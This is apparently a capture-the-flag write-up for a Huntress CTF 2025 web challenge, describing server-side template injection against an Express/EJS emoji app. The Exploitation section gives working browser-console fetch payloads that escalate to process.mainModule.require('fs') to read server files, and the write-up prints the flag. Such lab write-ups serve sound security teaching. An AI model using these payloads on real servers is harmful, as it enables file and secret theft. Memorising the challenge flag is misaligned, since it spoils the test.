> **Platform Name**: Huntress CTF 2025
> **Category**: #Web, #Express, #SSTI
> **Date**: 10-07-2025
> **Author**: Joe Lipinski
---
## Table of Contents
1. [Introduction](#introduction)
2. [Setup](#Setup)
3. [Reconnaissance](#reconnaissance)
4. [Exploitation](#exploitation)
5. [Post-Exploitation/Flag](#Post-Exploitation/Flag)
6. [Lessons Learned](#lessons%20learned)
7. [References](#References)

---
## Introduction

**Description:**
"Don't be shy, show your emotions! Get emotional if you have to! Uncover the flag."
`emotional.zip`

---
## Setup

- **Operating System:** MacOS
- **Tools Used:** #VSCode, #browser 
- **Network Configuration:** None

---
## Reconnaissance

### Initial Scanning
Source code files were provided, indicating that an Express web server was being used to host `.ejs` files. The web app allows the user to select an emoji, which is POSTed using an `Update Emotion` button. Based on this, it is likely the vulnerability is related to user input. 

```
# File structure
Public
	> Scripts
		client.js - Client-side JavaScript for handling emoji selection, AJAX requests to update the profile, and UI notifications.
views
	index.ejs - Main page template displaying the emoji profile interface, including the current emoji, selection grid, and interactive elements.
Dockerfile - Defines the Docker container configuration for deploying the application in a containerized environment.
flag.txt - Contains the challenge flag for the CTF (Capture The Flag) scenario.
package.json - NPM package manifest listing dependencies (e.g., Express, EJS) and project metadata.
server.js - Main server file handling HTTP routes, EJS rendering, and emoji profile management.
```

**Findings:**
Looking at the source code, the user input is unsafely handled, so this is the attack surface we will target.

---
## Exploitation

### SSTI Exploitation
Utilizing the browser's console, fetch commands can be sent to the server to inject templating language. The first attempt uses the require function.

```js
// First payload attempt
fetch('/setEmoji', {
	method: 'POST',
	headers: {
		'Content-Type': 'application/json'
	},
	body: JSON.stringify({
		emoji: '<%= require("fs").readFileSync("./flag.txt", "utf8") %>'
	})
}).then(response => {
	if (response.ok) {
		console.log('Payload sent. Reload the page to see the flag.');
		location.reload();
	} else {
		console.error('Failed to send payload');
	}
}).catch(error => console.error('Error:', error));
```

After running the payload in the browser's console, `require is not defined` is part of the returned page. This indicates that the payload is working, but the `require` function may not be accessible. This means shifting the payload to use the `global` accessor.

```js
// Second payload Attempt
emoji: '<%= global.require("fs").readFileSync("./flag.txt", "utf8") %>'
```

Running the updated payload also results in a similar message - `global.require is not a function`. This appears to be because EJS rendering relies on the `'use strict'` mode, which restricts access to undeclared globals like `global` and `require`. However, `process` (a Node.js global) should still be accessible. This means further modifying the payload to circumvent these checks.

``` js
// Thrid payload attempt
emoji: '<%= process.mainModule.require("fs").readFileSync("./flag.txt", "utf8") %>'
```

This payload is successful. 

---
## Post-Exploitation/Flag
### Capturing the Flag
The flag is returned within the HTML body of the page, where the emoji is normally displayed.

> [!success] Flag
> `flag{8c8e0e59d1292298b64c625b401e8cfa}`

---
## Lessons Learned
- Utilize fetch functions within the browser console to avoid curl commands with cookie token extractions
- **Understand Framework-Specific Exploitation Contexts**
	- Research how the target framework handles rendering (e.g., EJS's strict mode blocks direct `global` access but allows `process`). Test globals like `process.env` or `process.mainModule.require` for data exfil.
	- In Node.js apps, prioritize payloads accessing `process` or module internals. Use tools like `node-eval` or custom scripts to simulate rendering locally for payload crafting.
- Leverage Error Messages for Intelligence Gathering
	- Verbose errors (e.g., stack traces with line numbers) are goldmines— they reveal code structure and confirm injection. Capture them via intercepting proxies.

---
**Disclaimer** 
This write-up is for educational purposes only. Always obtain proper authorization before testing or exploiting any system.